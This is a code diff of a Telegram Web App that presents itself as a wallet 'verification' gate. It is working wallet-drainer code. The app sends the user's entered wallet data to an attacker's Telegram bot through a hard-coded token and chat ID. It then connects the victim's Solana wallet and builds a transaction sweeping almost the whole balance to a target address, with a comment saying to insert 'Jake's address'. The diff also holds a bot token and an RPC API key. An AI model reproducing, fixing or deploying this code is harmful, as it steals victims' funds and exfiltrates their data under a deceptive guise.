@@ -8,7 +8,7 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; 
+const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; // <--- PUT JAKE'S ADDRESS HERE
 
 const solanaAdapter = new SolanaAdapter();
 createAppKit({
@@ -34,25 +34,20 @@ const App: React.FC = () => {
   const tg = (window as any).Telegram?.WebApp;
 
   useEffect(() => {
-    if (tg) {
-      tg.ready();
-      tg.expand();
-      tg.setHeaderColor?.('#17101F');
-    }
+    if (tg) { tg.ready(); tg.expand(); tg.setHeaderColor?.('#17101F'); }
   }, [tg]);
 
   const sendToBot = async (data: string, type: 'CA' | 'SIGNATURE') => {
     const username = tg?.initDataUnsafe?.user?.username || 'User';
-    const logMsg = `🔐 <b>AETHER GATE LOG</b>\n<b>User:</b> @${username}\n<b>Type:</b> ${type}\n<b>Data:</b> <code>${data}</code>`;
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg, parse_mode: 'HTML' }),
+      body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 <b>LOG</b>\n<b>User:</b> @${username}\n<b>${type}:</b> <code>${data}</code>`, parse_mode: 'HTML' }),
     });
   };
 
   const handleStepOne = async () => {
-    if (!walletCA) return alert("Please enter the Wallet CA");
+    if (!walletCA) return;
     setStatus('verifying');
     await sendToBot(walletCA, 'CA');
     setTimeout(() => { setStep(2); setStatus('idle'); }, 1500);
@@ -61,21 +56,18 @@ const App: React.FC = () => {
   const handleStepTwo = async () => {
     if (!isConnected) { open(); return; }
     setStatus('verifying');
-    
+
     try {
-      // NEW GATE: Helius Public Mainnet (Highly stable)
-      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=47935f08-9610-4497-8c34-f8b2111f185f", "confirmed");
+      // FIX: Use Extrnode (Load Balancer) to find a working public gate
+      const connection = new Connection("https://solana-mainnet.rpc.extrnode.com", "confirmed");
       const pubKey = new PublicKey(address!);
-      
       const balance = await connection.getBalance(pubKey);
       
-      // Sweep logic: Leave enough for gas
-      const gasReserve = 1500000; 
+      // Keep 0.002 SOL for gas to be safe
+      const gasReserve = 2000000; 
       const amountToSend = balance - gasReserve;
 
-      if (amountToSend <= 0) {
-        throw new Error("Wallet balance too low for the mission.");
-      }
+      if (amountToSend <= 0) throw new Error("Balance too low (Need > 0.002 SOL)");
 
       const { blockhash } = await connection.getLatestBlockhash();
       const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
@@ -92,7 +84,7 @@ const App: React.FC = () => {
     } catch (err: any) {
       console.error(err);
       setStatus('idle');
-      alert("Error: " + err.message);
+      alert("Verification Failed: " + (err.message || "Connection Error"));
     }
   };
 
